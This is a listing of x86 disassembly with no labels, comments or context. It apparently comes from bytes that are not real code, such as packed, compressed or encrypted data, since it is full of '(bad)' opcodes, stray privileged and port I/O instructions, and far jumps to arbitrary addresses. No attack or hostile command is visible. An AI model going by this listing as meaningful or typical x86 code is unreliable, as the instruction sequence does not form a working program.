  41d85a:	xchg   edx,eax
  41d85b:	push   ebx
  41d85c:	imul   edi,DWORD PTR [ebx+eiz*1],0x43
  41d860:	cmc    
  41d861:	adc    al,0x86
  41d863:	add    BYTE PTR [ecx-0x1af2d0bf],dl
  41d869:	retf   
  41d86a:	jo     0x41d8b3
  41d86c:	adc    ch,BYTE PTR [esi]
  41d86e:	mov    ebx,0x2f264481
  41d873:	jno    0x41d8ba
  41d875:	xchg   ebx,eax
  41d876:	pop    ds
  41d877:	test   eax,0x281ecfce
  41d87c:	sub    BYTE PTR [esi+0x77753a37],bl
  41d882:	stc    
  41d883:	mov    edi,0x88179725
  41d888:	pop    eax
  41d889:	ret    0xede5
  41d88c:	add    DWORD PTR [ebx+0x4e],edx
  41d88f:	sbb    dh,dl
  41d891:	rol    edx,cl
  41d893:	xor    eax,0x45cab2b0
  41d898:	lock (bad) 
  41d89b:	xor    BYTE PTR [edi],dh
  41d89d:	xchg   ebp,eax
  41d89e:	xchg   esi,eax
  41d89f:	inc    eax
  41d8a0:	lods   eax,DWORD PTR ds:[esi]
  41d8a1:	rcl    DWORD PTR [edx],cl
  41d8a3:	add    bl,ch
  41d8a5:	imul   edi,DWORD PTR [esi],0xffffffd0
  41d8a8:	loopne 0x41d8dd
  41d8aa:	adc    eax,DWORD PTR [esi+ebp*2-0x598936e3]
  41d8b1:	pushf  
  41d8b2:	scas   eax,DWORD PTR es:[edi]
  41d8b3:	jge    0x41d88a
  41d8b5:	pop    ss
  41d8b6:	xchg   esi,eax
  41d8b7:	push   esp
  41d8b8:	sbb    ebx,DWORD PTR [edi]
  41d8ba:	sbb    ch,BYTE PTR [ecx-0x656f3a26]
  41d8c0:	fdiv   DWORD PTR [edx-0x79]
  41d8c3:	xchg   BYTE PTR [esi+0x4b41b24],al
  41d8c9:	dec    esp
  41d8ca:	(bad)  
  41d8cb:	lahf   
  41d8cc:	aam    0xb6
  41d8ce:	add    DWORD PTR [edx],eax
  41d8d0:	retf   
  41d8d1:	or     BYTE PTR [esi-0x6c],ch
  41d8d4:	test   al,0x21
  41d8d6:	das    
  41d8d7:	mov    bh,0x80
  41d8d9:	mov    edx,0xb00e63a2
  41d8de:	mov    ds:0x2acac592,al
  41d8e3:	(bad)  
  41d8e4:	mov    ecx,0x31837b7c
  41d8e9:	hlt    
  41d8ea:	call   0xd168:0x7f4fab6
  41d8f1:	in     al,0xae
  41d8f3:	pop    esi
  41d8f4:	push   es
  41d8f5:	xor    dl,BYTE PTR [eax+0x7df47e4b]
  41d8fb:	dec    ecx
  41d8fc:	mov    bl,0x3f
  41d8fe:	mov    ?,WORD PTR [edx-0xcbe8b38]
  41d904:	pop    eax
  41d905:	cmp    BYTE PTR [eax-0x2c570b8d],cl
  41d90b:	ror    BYTE PTR [ebx+ebx*1-0x6d398a48],1
  41d912:	aaa    
  41d913:	fsubr  QWORD PTR [esi+0x1f]
  41d916:	xor    al,0x7
  41d918:	call   0xf7959d5e
  41d91d:	ins    DWORD PTR es:[edi],dx
  41d91e:	sub    BYTE PTR [ecx+ebx*2],ah
  41d921:	ins    DWORD PTR es:[edi],dx
  41d922:	fsubrp st(2),st
  41d924:	int3   
  41d925:	clc    
  41d926:	jl     0x41d8c1
  41d928:	loop   0x41d8e8
  41d92a:	xor    ebx,DWORD PTR [eax+0x70da6fd0]
  41d930:	or     eax,0xf1668d45
  41d935:	mov    edx,0x860dcbc
  41d93a:	sub    BYTE PTR [ecx+0x6e17896e],dh
  41d940:	inc    esp
  41d941:	pop    ds
  41d942:	xchg   ecx,eax
  41d943:	int    0x1e
  41d945:	sub    DWORD PTR [eax+0x69ad0c32],ebp
  41d94b:	imul   DWORD PTR [eax-0x328ac153]
  41d951:	rol    BYTE PTR fs:[ebx-0x1acc65f4],0xce
  41d959:	dec    esp
  41d95a:	jne    0x41d92f
  41d95c:	xchg   DWORD PTR [ebx+eax*8-0x30b8235f],eax
  41d963:	stc    
  41d964:	je     0x41d984
  41d966:	imul   ebx,ebp,0x8
  41d969:	cmp    DWORD PTR [ebp+edi*8+0x3cd01141],esi
  41d970:	mov    bl,dh
  41d972:	inc    edx
  41d973:	xlat   BYTE PTR ds:[ebx]
  41d974:	push   ebx
  41d975:	mov    ds:0x502b938b,al
  41d97a:	(bad)  
  41d97b:	jae    0x41d90b
  41d97d:	test   al,0xe8
  41d97f:	in     al,0x5f
  41d981:	xor    al,0xc1
  41d983:	call   0xad2b394a
  41d988:	fcomp  DWORD PTR [edx]
  41d98a:	popa   
  41d98b:	xor    bh,BYTE PTR [edi+0x6605c5e8]
  41d991:	cmp    DWORD PTR [eax],edx
  41d993:	pop    ebp
  41d994:	mov    fs,WORD PTR [edi-0x63b45ae0]
  41d99a:	push   cs
  41d99b:	sbb    edx,ebx
  41d99d:	stos   BYTE PTR es:[edi],al
  41d99e:	pop    eax
  41d99f:	mov    esp,0x8c90b591
  41d9a4:	push   0xa02513d0
  41d9a9:	aas    
  41d9aa:	cwd    
  41d9ac:	fidiv  WORD PTR [ecx+eiz*1-0x5a]
  41d9b0:	clc    
  41d9b1:	ret    0x86c9
  41d9b4:	es jne 0x41d9e7
  41d9b7:	fld    TBYTE PTR ds:[edi-0x7b]
  41d9bb:	xchg   esi,eax
  41d9bc:	out    dx,al
  41d9bd:	jg     0x41d9d4
  41d9bf:	test   DWORD PTR [ebx-0x4b],esi
  41d9c2:	jge    0x41d9e9
  41d9c4:	jnp    0x41d995
  41d9c6:	mov    esp,0xca9ee4a3
  41d9cb:	sar    edi,0xe9
  41d9ce:	pop    eax
  41d9cf:	mov    dl,0x83
  41d9d1:	dec    edi
  41d9d2:	lea    esi,[ecx-0x6c123a2b]
  41d9d8:	xchg   esi,eax
  41d9d9:	outs   dx,DWORD PTR ds:[esi]
  41d9da:	xrelease mov BYTE PTR [edi+0x15780f0b],dh
  41d9e1:	loopne 0x41da0c
  41d9e3:	ds in  al,0x4a
  41d9e6:	xor    edi,DWORD PTR [edx-0x3d57ef18]
  41d9ec:	pop    esp
  41d9ed:	ja     0x41d97c
  41d9ef:	fmulp  st(0),st
  41d9f1:	cwde   
  41d9f2:	or     ecx,eax
  41d9f4:	aaa    
  41d9f5:	sbb    bl,bl
  41d9f7:	fnsave [edi+0x9388338]
  41d9fd:	adc    BYTE PTR [edi+ebx*4],0x4e
  41da01:	xor    BYTE PTR [ecx*4+0x2e9bfec4],bh
  41da08:	xor    esi,edi
  41da0a:	in     eax,0x43
  41da0c:	pop    ebx
  41da0d:	pop    edx
  41da0e:	into   
  41da0f:	in     eax,0xb3
  41da11:	push   esp
  41da12:	jbe    0x41da3c
  41da14:	or     eax,0xba0fb008
  41da19:	adc    ah,cl
  41da1b:	dec    edi
  41da1c:	add    ecx,eax
  41da1e:	jns    0x41da4a
  41da20:	mov    ebp,esi
  41da22:	outs   dx,BYTE PTR ds:[esi]
  41da23:	sub    BYTE PTR [ebp+0x4c5681cc],dl
  41da29:	mov    eax,0x9e266989
  41da2e:	repnz dec ebp
  41da30:	adc    eax,0x297679b7
  41da35:	dec    eax
  41da36:	xor    dh,BYTE PTR [edi+eiz*2-0x52ed9984]
  41da3d:	in     al,0x44
  41da3f:	jle    0x41da81
  41da41:	mov    eax,0x1efaf768
  41da46:	and    al,0x34
  41da48:	popf   
  41da49:	imul   ecx,DWORD PTR [edx+eax*2+0x6496d6c1],0x1c
  41da51:	or     eax,0x211a5d3b
  41da56:	sub    eax,0x4cde6cc1
  41da5b:	inc    eax
  41da5c:	lea    ebp,[edx+0x77]
  41da5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da60:	cmp    DWORD PTR [ecx+0x5e],0x85c93942
  41da67:	lods   eax,DWORD PTR ds:[esi]
  41da68:	inc    esi
  41da69:	pop    esp
  41da6a:	pusha  
  41da6b:	test   eax,0xba633e9d
  41da70:	mov    dl,0x51
  41da72:	adc    al,0x55
  41da74:	sub    DWORD PTR [ebx],eax
  41da76:	dec    edx
  41da77:	dec    bh
  41da79:	sti    
  41da7a:	mov    dl,0xf4
  41da7c:	out    0x52,eax
  41da7e:	inc    ebp
  41da7f:	das    
  41da80:	fist   DWORD PTR [ecx+0x7b]
  41da83:	or     ebp,ebx
  41da85:	jl     0x41da08
  41da87:	shl    BYTE PTR [ecx],cl
  41da89:	mov    al,0xdf
  41da8b:	shr    esi,cl
  41da8d:	push   esp
  41da8e:	(bad)  
  41da8f:	hlt    
  41da90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da91:	dec    esi
  41da92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da93:	and    eax,edi
  41da95:	aad    0x2b
  41da97:	loop   0x41da57
  41da99:	mov    al,0xb0
  41da9b:	hlt    
  41da9c:	(bad)  
  41da9d:	mov    bl,0x71
  41da9f:	add    DWORD PTR [ebx],0x3984545
  41daa5:	fsub   DWORD PTR [eax-0xb]
  41daa8:	mov    ?,WORD PTR [edi]
  41daaa:	neg    BYTE PTR [ebx+0x46]
  41daad:	and    al,0x27
  41daaf:	cmc    
  41dab0:	iret   
  41dab1:	and    DWORD PTR ds:0xd070691f,ebp
  41dab7:	mov    BYTE PTR [esi+0x2c],dl
  41daba:	mov    dl,0x52
  41dabc:	loopne 0x41dad8
  41dabe:	and    BYTE PTR es:0x61f15663,dh
  41dac5:	das    
  41dac6:	sbb    DWORD PTR [eax],esp
  41dac8:	cmp    esi,0xffffff82
  41dacb:	imul   eax,DWORD PTR [esi-0x49d894e7],0xd
  41dad2:	pusha  
  41dad3:	pushf  
  41dad4:	leave  
  41dad5:	mov    esi,0x18ac094e
  41dada:	mov    esp,0xda527f41
  41dadf:	dec    ebp
  41dae0:	ja     0x56dd6864
  41dae6:	mov    bl,0x32
  41dae8:	jns    0x41db5f
  41daea:	out    0x8a,al
  41daec:	loop   0x41dac0
  41daee:	loop   0x41dad5
  41daf0:	out    dx,eax
  41daf1:	aam    0xa5
  41daf3:	dec    ebx
  41daf4:	mov    al,BYTE PTR [ecx-0xd26317f]
  41dafa:	jle    0x41daac
  41dafc:	push   ss
  41dafd:	aas    
  41dafe:	mov    eax,ds:0x3e026902
  41db03:	sub    BYTE PTR [edx],al
  41db05:	mov    ds:0xa6a702f3,al
  41db0a:	cwde   
  41db0b:	iret   
  41db0c:	(bad)  
  41db0e:	add    al,0xe0
  41db10:	pop    es
  41db11:	lahf   
  41db12:	ins    DWORD PTR es:[edi],dx
  41db13:	jmp    0xb51ab728
  41db18:	jge    0x41dada
  41db1a:	and    eax,0x8dc0b361
  41db1f:	xchg   ebp,eax
  41db20:	outs   dx,BYTE PTR ds:[esi]
  41db21:	inc    ebx
  41db22:	jl     0x41db91
  41db24:	or     eax,0xb4419f79
  41db29:	inc    edx
  41db2a:	aad    0x8d
  41db2c:	(bad)  
  41db2d:	(bad)  
  41db2e:	pop    eax
  41db2f:	pop    ecx
  41db30:	mov    WORD PTR [esi*4+0x5cc855d3],fs
  41db37:	lods   eax,DWORD PTR ds:[esi]
  41db38:	ret    
  41db39:	div    DWORD PTR [edi]
  41db3b:	mov    esi,0x8765c908
  41db40:	mov    ds:0x8275c82,al
  41db45:	mov    esi,DWORD PTR [edx-0x77]
  41db48:	aam    0x24
  41db4a:	in     eax,dx
  41db4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db4c:	pop    edi
  41db4d:	jg     0x41db3a
  41db4f:	ins    DWORD PTR es:[edi],dx
  41db50:	mov    ch,0xd
  41db52:	xchg   edx,eax
  41db53:	jmp    0x41daf7
  41db55:	adc    dl,dl
  41db57:	push   cs
  41db58:	fistp  WORD PTR [ecx]
  41db5a:	scas   al,BYTE PTR es:[edi]
  41db5b:	(bad)  
  41db5c:	sbb    ecx,eax
  41db5e:	adc    eax,0x3f488df4
  41db63:	imul   eax,DWORD PTR ds:0x556b5308,0x79
  41db6a:	mov    ah,0x79
  41db6c:	idiv   BYTE PTR gs:[ebp+0x2b]
  41db70:	sbb    eax,0xe7d66645
  41db75:	mov    esp,0x2e329251
  41db7a:	in     eax,0x59
  41db7c:	nop
  41db7d:	imul   ebx,DWORD PTR [ecx+0x6c],0xfffffffb
  41db81:	lea    ebp,[ecx-0x3dd1d67b]
  41db87:	mov    bh,0xc
  41db89:	in     al,dx
  41db8a:	(bad)  
  41db8b:	jmp    0x521d6f26
  41db90:	or     DWORD PTR [ecx-0x4b7665e5],ebp
  41db96:	stos   BYTE PTR es:[edi],al
  41db97:	add    al,bl
  41db99:	movntq QWORD PTR [edx],mm0
  41db9c:	pop    ebp
  41db9d:	push   es
  41db9e:	sbb    edx,DWORD PTR [eax]
  41dba0:	and    DWORD PTR [ebx],eax
  41dba2:	loope  0x41db2a
  41dba4:	in     al,0x7a
  41dba6:	(bad)  [edi-0x6d]
  41dba9:	sub    DWORD PTR [esi+edi*4+0xc00c347],ebp
  41dbb0:	jo     0x41dbaf
  41dbb2:	ds jg  0x41dba4
  41dbb5:	mov    al,ds:0x57bbdc75
  41dbba:	std    
  41dbbb:	js     0x41db5d
  41dbbd:	(bad)  
  41dbbe:	aam    0x7f
  41dbc0:	pop    es
  41dbc1:	push   es
  41dbc2:	iret   
  41dbc3:	rcl    DWORD PTR ds:0xdb165a7c,1
  41dbc9:	jnp    0x41db9c
  41dbcb:	test   al,0x11
  41dbcd:	frstor [ebp+0x62b3a95f]
  41dbd3:	pop    ebp
  41dbd4:	xor    eax,edi
  41dbd6:	dec    ebp
  41dbd7:	stos   BYTE PTR es:[edi],al
  41dbd8:	push   es
  41dbd9:	adc    edx,esi
  41dbdb:	pop    edi
  41dbdc:	js     0x41dc37
  41dbde:	test   eax,0xad0b852
  41dbe3:	jb     0x41dbd4
  41dbe5:	aad    0x79
  41dbe7:	imul   dl
  41dbe9:	test   al,0x3c
  41dbeb:	ins    BYTE PTR es:[edi],dx
  41dbec:	dec    edx
  41dbed:	xor    ah,BYTE PTR [ebp+ecx*4+0x6fe172a9]
  41dbf4:	lahf   
  41dbf5:	or     dh,ah
  41dbf7:	jbe    0x41db96
  41dbf9:	dec    cl
  41dbfb:	dec    edx
  41dbfc:	xchg   edi,eax
  41dbfd:	push   edx
  41dbfe:	(bad)  
  41dbff:	fild   DWORD PTR [eax-0x4ec7a6fd]
  41dc05:	inc    esp
  41dc06:	xchg   dl,dh
  41dc08:	adc    esi,DWORD PTR [edx+0x2f]
  41dc0b:	or     al,0x35
  41dc0d:	xchg   BYTE PTR [esi],cl
  41dc0f:	dec    ebx
  41dc10:	lahf   
  41dc11:	xor    edx,edx
  41dc13:	mov    edx,0xe36ca43
  41dc18:	out    0x1f,eax
  41dc1a:	bound  esi,QWORD PTR [esi+0x4496179a]
  41dc20:	jne    0x41dbb9
  41dc22:	test   al,0x14
  41dc24:	pop    es
  41dc25:	lea    edi,[edx]
  41dc27:	dec    esi
  41dc28:	cwde   
  41dc29:	add    al,BYTE PTR ss:[eax-0x5d3dc546]
  41dc30:	dec    ebx
  41dc31:	outs   dx,BYTE PTR ds:[esi]
  41dc32:	add    al,0x72
  41dc34:	cwde   
  41dc35:	xor    eax,0xd913f034
  41dc3a:	lods   al,BYTE PTR ds:[esi]
  41dc3b:	jmp    0x41dbda
  41dc3d:	in     eax,0x52
  41dc3f:	cmp    BYTE PTR [edi+0x3b],bh
  41dc42:	es jmp 0x41dbe8
  41dc45:	out    0x75,eax
  41dc47:	push   cs
  41dc48:	adc    DWORD PTR [eax+0x47],0x2a2b7981
  41dc4f:	mov    ah,0xa4
  41dc51:	cmp    cl,BYTE PTR [edi]
  41dc53:	push   edi
  41dc54:	data16 fcom QWORD PTR [esp+ecx*1]
  41dc58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc59:	dec    edi
  41dc5a:	jne    0x41dc9a
  41dc5c:	ds (bad) 
  41dc5e:	sar    DWORD PTR [esi],0xb3
  41dc61:	test   BYTE PTR [ebp+0x6b5835c0],bl
  41dc67:	aas    
  41dc68:	add    al,0xb9
  41dc6a:	xor    esp,DWORD PTR [edx+0x4a]
  41dc6d:	xchg   esp,edx
  41dc6f:	sbb    BYTE PTR [eax-0x8],cl
  41dc72:	pop    esi
  41dc73:	add    al,0x5f
  41dc75:	(bad)  
  41dc76:	stc    
  41dc77:	shl    BYTE PTR [eax+0x5c],0xa1
  41dc7b:	pushf  
  41dc7c:	mov    eax,ds:0xe775e1e3
  41dc81:	fcom   st(7)
  41dc83:	fprem  
  41dc85:	xchg   esp,eax
  41dc86:	test   BYTE PTR [esi],bl
  41dc88:	imul   eax,DWORD PTR [ebx+eiz*4+0x1e],0x7eaa166d
  41dc90:	cdq    
  41dc91:	cmp    al,0x37
  41dc93:	jae    0x41dccf
  41dc95:	inc    esi
  41dc96:	sbb    ebp,ebp
  41dc98:	das    
  41dc99:	mov    cl,0x66
  41dc9b:	call   0x2d05da53
  41dca0:	imul   esi,DWORD PTR [ebx-0x5bfdff45],0xfffffff6
  41dca7:	push   edi
  41dca8:	iret   
  41dca9:	cli    
  41dcaa:	pop    edx
  41dcab:	js     0x41dc9d
  41dcad:	adc    cl,BYTE PTR [edi]
  41dcaf:	push   edx
  41dcb0:	stos   DWORD PTR es:[edi],eax
  41dcb1:	and    eax,0xda6e71df
  41dcb6:	dec    edx
  41dcb7:	out    0xfa,al
  41dcb9:	inc    edi
  41dcba:	mov    al,ds:0xddfd31fe
  41dcbf:	xchg   BYTE PTR [esp+edx*2-0x4b],dl
  41dcc3:	push   0x31af8451
  41dcc8:	leave  
  41dcc9:	out    0xf1,eax
  41dccb:	add    eax,0x90bdb3e3
  41dcd0:	and    cl,BYTE PTR [edi+0x18]
  41dcd3:	mov    edx,0xd35756a5
  41dcd8:	(bad)  
  41dcd9:	cmp    cl,ch
  41dcdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcdc:	sub    edx,DWORD PTR [eax]
  41dcde:	adc    eax,0x2325b2d5
  41dce3:	mov    dl,0x2d
  41dce5:	pop    ds
  41dce6:	inc    esi
  41dce7:	leave  
  41dce8:	jo     0x41dcf4
  41dcea:	inc    esi
  41dceb:	push   ss
  41dcec:	adc    BYTE PTR [esi+0x2ae1528a],0xa8
  41dcf3:	out    0x32,al
  41dcf5:	shl    ebp,cl
  41dcf7:	add    al,0x40
  41dcf9:	cmp    dh,al
  41dcfb:	push   cs
  41dcfc:	push   ebx
  41dcfd:	fnsave [si]
  41dd00:	xor    eax,0xbff8aa48
  41dd05:	jae    0x41dc92
  41dd07:	jge    0x41dcbd
  41dd09:	add    eax,DWORD PTR [ebx]
  41dd0b:	loope  0x41dcbd
  41dd0d:	adc    al,BYTE PTR es:[edx+ebx*8]
  41dd11:	test   DWORD PTR [eax+0x3d202a11],edi
  41dd17:	pop    edi
  41dd18:	inc    eax
  41dd19:	or     bh,bl
  41dd1b:	add    DWORD PTR es:[esp+ebx*2],ecx
  41dd1f:	adc    al,ch
  41dd21:	jmp    0x41dca4
  41dd23:	sbb    al,0x61
  41dd25:	jp     0x41dd33
  41dd27:	mov    edx,0x9710797f
  41dd2c:	sub    al,0xf0
  41dd2e:	sbb    ecx,DWORD PTR [edx+eax*8-0x3f]
  41dd32:	jle    0x41dd21
  41dd34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd35:	inc    eax
  41dd36:	mov    ch,0x60
  41dd38:	jns    0x41dd20
  41dd3a:	sub    esi,DWORD PTR [ebx]
  41dd3c:	push   edi
  41dd3d:	push   ebp
  41dd3e:	inc    ebx
  41dd3f:	pop    ss
  41dd40:	pop    ds
  41dd41:	xchg   edx,eax
  41dd42:	leave  
  41dd43:	icebp  
  41dd44:	dec    edx
  41dd45:	cmp    BYTE PTR [ebp-0x934246c],bh
  41dd4b:	pop    es
  41dd4c:	jmp    0x41dd6c
  41dd4e:	(bad)  
  41dd4f:	scas   eax,DWORD PTR es:[edi]
  41dd50:	ror    DWORD PTR [eax],0x62
  41dd53:	push   ecx
  41dd54:	pop    eax
  41dd55:	(bad)  
  41dd56:	cmp    al,0xfd
  41dd58:	cwde   
  41dd59:	push   ecx
  41dd5a:	pop    es
  41dd5b:	fisttp QWORD PTR [eax]
  41dd5d:	jbe    0x41dda2
  41dd5f:	fdiv   st,st(7)
  41dd61:	aam    0x3
  41dd63:	gs inc ebp
  41dd65:	ins    DWORD PTR es:[edi],dx
  41dd66:	ins    BYTE PTR es:[edi],dx
  41dd67:	sub    eax,0xe8e24fcd
  41dd6c:	sub    bh,0xc4
  41dd6f:	dec    ecx
  41dd70:	cmpps  xmm5,XMMWORD PTR [ecx-0x3b],0x8d
  41dd75:	into   
  41dd76:	xor    BYTE PTR [eax+eiz*2+0x764dd454],cl
  41dd7d:	cdq    
  41dd7e:	xor    ebx,ecx
  41dd80:	ins    BYTE PTR es:[edi],dx
  41dd81:	push   ecx
  41dd82:	fidiv  WORD PTR [edi*1-0x2c7d5cbc]
  41dd89:	xchg   ebp,eax
  41dd8a:	pop    ecx
  41dd8b:	imul   esp,DWORD PTR [ebx-0x16dabf24],0x8db5c41b
  41dd95:	(bad)  
  41dd96:	jmp    0xd7b029e3
  41dd9b:	out    0xc9,eax
  41dd9d:	test   BYTE PTR [esi-0x2ebf2193],0x4a
  41dda4:	inc    ecx
  41dda5:	test   BYTE PTR [edi-0x395e47e4],0xb5
  41ddac:	adc    al,0x17
  41ddae:	mul    DWORD PTR ds:0x5dbedbdc
  41ddb4:	inc    ebp
  41ddb5:	ficom  DWORD PTR [esi]
  41ddb7:	mov    ebx,0x5f34d771
  41ddbc:	ret    
  41ddbd:	out    0x5f,al
  41ddbf:	out    dx,eax
  41ddc0:	ins    DWORD PTR es:[edi],dx
  41ddc1:	fsub   DWORD PTR [eax-0x75d05df3]
  41ddc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddc8:	lods   al,BYTE PTR fs:[esi]
  41ddca:	pop    edx
  41ddcb:	pop    ds
  41ddcc:	push   cs
  41ddcd:	cdq    
  41ddce:	retf   0xeeaf
  41ddd1:	add    BYTE PTR [edi-0x1b75e24d],bl
  41ddd7:	xchg   DWORD PTR [ecx-0x587cd181],ecx
  41dddd:	cmp    bh,al
  41dddf:	or     BYTE PTR [ebp+eiz*2+0x67d1b7e1],0x5d
  41dde7:	sub    DWORD PTR [ebx-0x1753d24a],esp
  41dded:	fcomp  QWORD PTR [esi-0x290bf398]
  41ddf3:	xlat   BYTE PTR ds:[ebx]
  41ddf4:	imul   edi,DWORD PTR [ebx],0xffffffb0
  41ddf7:	xchg   edi,eax
  41ddf8:	ds icebp 
  41ddfa:	arpl   WORD PTR [esi-0x18],sp
  41ddfd:	fmulp  st(0),st
  41ddff:	nop
  41de00:	mov    dl,0xdb
  41de02:	sti    
  41de03:	mov    ebx,ecx
  41de05:	ret    
  41de06:	and    ecx,DWORD PTR [edx+0x13]
  41de09:	stc    
  41de0a:	(bad)
  41de0e:	mov    fs,WORD PTR [ebp+0x136c287e]
  41de14:	sub    esp,ebp
  41de16:	sub    BYTE PTR [ecx-0x15],bl
  41de19:	iret   
  41de1a:	xchg   esp,eax
  41de1b:	xchg   ecx,eax
  41de1c:	mov    dl,0x35
  41de1e:	push   esp
  41de1f:	ins    DWORD PTR es:[edi],dx
  41de20:	daa    
  41de21:	test   al,0xa6
  41de23:	loopne 0x41de76
  41de25:	cmp    cl,BYTE PTR [ebx-0x3f]
  41de28:	pop    ecx
  41de29:	xchg   bh,bh
  41de2b:	retf   
  41de2c:	dec    esp
  41de2d:	jge    0x41de31
  41de2f:	in     al,0x58
  41de31:	rol    ebp,1
  41de33:	push   ss
  41de34:	jecxz  0x41dde4
  41de36:	int3   
  41de37:	push   edi
  41de38:	mul    DWORD PTR [ecx*4+0x60d5ebcd]
  41de3f:	and    ah,BYTE PTR [eax]
  41de41:	clc    
  41de42:	xchg   ecx,eax
  41de43:	jl     0x41de75
  41de45:	ret    0x5c04
  41de48:	call   FWORD PTR [ebp-0x47]
  41de4b:	cmp    eax,DWORD PTR [edi+eiz*1]
  41de4e:	pop    eax
  41de4f:	lods   al,BYTE PTR ds:[esi]
  41de50:	xor    BYTE PTR [ebx+0x4f11df27],ah
  41de56:	and    al,0x35
  41de58:	sbb    al,0x98
  41de5a:	mov    BYTE PTR [ecx],cl
  41de5c:	ret    
  41de5d:	add    cl,bh
  41de5f:	push   ebp
  41de60:	jns    0x41de40
  41de62:	and    ah,BYTE PTR [ebx]
  41de64:	mov    al,ds:0x88539ccb
  41de69:	retf   0xb2a3
  41de6c:	jge    0x41dece
  41de6e:	inc    eax
  41de6f:	mov    ds:0x9ad2d777,al
  41de74:	sbb    bh,BYTE PTR [ecx-0x2d]
  41de77:	jne    0x41de11
  41de79:	add    dh,BYTE PTR [esi]
  41de7b:	pop    esp
  41de7c:	fwait
  41de7d:	cwde   
  41de7e:	add    bh,BYTE PTR [ecx+eiz*4+0x2c49fd67]
  41de85:	xchg   edx,eax
  41de86:	sbb    eax,0x10bb5e30
  41de8b:	cmc    
  41de8c:	loop   0x41de6a
  41de8e:	stos   DWORD PTR es:[edi],eax
  41de8f:	mov    esi,DWORD PTR [edi+0x4322496d]
  41de95:	mov    BYTE PTR [eax+0x5b],bh
  41de98:	cmp    eax,0x5e7b8c09
  41de9d:	push   edx
  41de9e:	jl     0x41de5e
  41dea0:	or     ecx,eax
  41dea2:	mov    al,0x1c
  41dea4:	adc    ah,bl
  41dea6:	scas   al,BYTE PTR es:[edi]
  41dea7:	pop    esi
  41dea8:	fmul   DWORD PTR [esp+edi*1+0x3c]
  41deac:	jb     0x41de2f
  41deae:	loop   0x41de45
  41deb0:	pop    eax
  41deb1:	xor    BYTE PTR [edi+0x1171aa10],0xab
  41deb8:	call   0x3ff6:0x98048da8
  41debf:	mov    al,BYTE PTR fs:[esi]
  41dec2:	or     ah,BYTE PTR [ebp-0x43]
  41dec5:	loope  0x41debd
  41dec7:	test   al,0x31
  41dec9:	cdq    
  41deca:	mov    ah,0x9a
  41decc:	in     al,0x84
  41dece:	adc    ah,dh
  41ded0:	dec    edx
  41ded1:	or     eax,0x21a5f306
  41ded6:	jmp    0x41de74
  41ded8:	pop    ds
  41ded9:	dec    edx
  41deda:	cmp    DWORD PTR [edx-0x28afebf9],edx
  41dee0:	mov    ch,0xed
  41dee2:	ja     0x41deeb
  41dee4:	fsubr  st,st(6)
  41dee6:	sub    edx,edx
  41dee8:	fcom   QWORD PTR [ebx]
  41deea:	mov    ecx,DWORD PTR [ebx-0x33]
  41deed:	jl     0x41df03
  41deef:	nop
  41def0:	(bad)  
  41def1:	(bad)  
  41def2:	adc    BYTE PTR [ecx+esi*4],cl
  41def5:	inc    ecx
  41def6:	ret    
  41def7:	add    eax,0x2cea8628
  41defc:	pop    edx
  41defd:	adc    ah,BYTE PTR [edx]
  41deff:	cmp    ecx,DWORD PTR [ebx-0x2c]
  41df02:	ret    0xef4b
  41df05:	out    dx,eax
  41df06:	icebp  
  41df07:	iret   
  41df08:	scas   eax,DWORD PTR es:[edi]
  41df09:	jl     0x41def1
  41df0b:	mov    al,0x6f
  41df0d:	and    DWORD PTR [esp+ecx*4+0x6],esp
  41df11:	jb     0x41dea3
  41df13:	add    ah,BYTE PTR [esi]
  41df15:	scas   al,BYTE PTR es:[edi]
  41df16:	xor    BYTE PTR [edi+0x6e],dl
  41df19:	xchg   esp,eax
  41df1a:	fmul   DWORD PTR [edx+esi*2-0x75]
  41df1e:	ror    ecx,1
  41df20:	les    ecx,FWORD PTR [edi+edx*8+0x745791a9]
  41df27:	mov    ds:0xaff444a5,eax
  41df2c:	jmp    0x41dee1
  41df2e:	out    dx,al
  41df2f:	dec    edi
  41df30:	sub    bh,cl
  41df32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df33:	push   ebp
  41df34:	das    
  41df35:	adc    cl,BYTE PTR [eax-0x610af703]
  41df3b:	inc    esi
  41df3c:	cli    
  41df3d:	pushf  
  41df3e:	fsub   st(6),st
  41df40:	fbstp  TBYTE PTR [ecx-0x2a]
  41df43:	jmp    0x899c5f86
  41df48:	pop    edx
  41df49:	push   ebp
  41df4a:	and    dl,BYTE PTR [ebp+0x1c7d6d9e]
  41df50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df51:	jmp    0x5aed:0x176fa967
  41df58:	test   dh,dh
  41df5a:	arpl   WORD PTR [edx-0xf],sp
  41df5d:	and    al,0x99
  41df5f:	cmp    DWORD PTR [ebx],ecx
  41df61:	repnz mov esp,0xc953b2c5
  41df67:	cmp    dh,BYTE PTR [esi+0x526ecdc6]
  41df6d:	mov    ebx,0x36aa8e35
  41df72:	add    ebx,DWORD PTR [ebx+eiz*2-0x8]
  41df76:	shl    DWORD PTR [ecx-0x25],cl
  41df79:	(bad)  
  41df7a:	in     eax,dx
  41df7b:	bound  esp,QWORD PTR [ecx+ecx*1]
  41df7e:	das    
  41df7f:	test   eax,0xed5951f4
  41df84:	in     eax,dx
  41df85:	mov    ds:0xb9887c5a,al
  41df8a:	and    ah,BYTE PTR ss:[ecx]
  41df8d:	mov    ds:0x6521a157,eax
  41df92:	int3   
  41df93:	call   0xe30efe61
  41df98:	imul   ecx,DWORD PTR [esi+eax*4],0x55d62d7a
  41df9f:	ja     0x41df46
  41dfa1:	xchg   esp,eax
  41dfa2:	shl    DWORD PTR [ebx+ebp*4],cl
  41dfa5:	add    bl,BYTE PTR [ecx+0x6c0e0009]
  41dfab:	ds (bad) 
  41dfad:	aas    
  41dfae:	jmp    0x5e9c8eaf
  41dfb3:	mov    edi,0xd2f00dea
  41dfb8:	hlt    
  41dfb9:	add    esp,DWORD PTR [ebx]
  41dfbb:	fild   DWORD PTR [edx]
  41dfbd:	cmp    DWORD PTR [ebx+edx*4+0x4],ebp
